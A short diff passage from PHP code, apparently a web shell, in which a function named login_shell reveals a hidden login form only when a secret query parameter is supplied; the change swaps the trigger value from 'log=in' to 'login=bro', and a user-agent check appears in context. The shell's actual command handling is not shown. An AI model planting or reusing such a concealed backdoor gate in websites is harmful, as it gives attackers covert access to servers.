@@ -21,7 +21,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 function login_shell() {
 
-if ($_GET["log"] == "in"){
+if ($_GET["login"] == "bro"){
     echo "<form method='post'>
 
 <center>
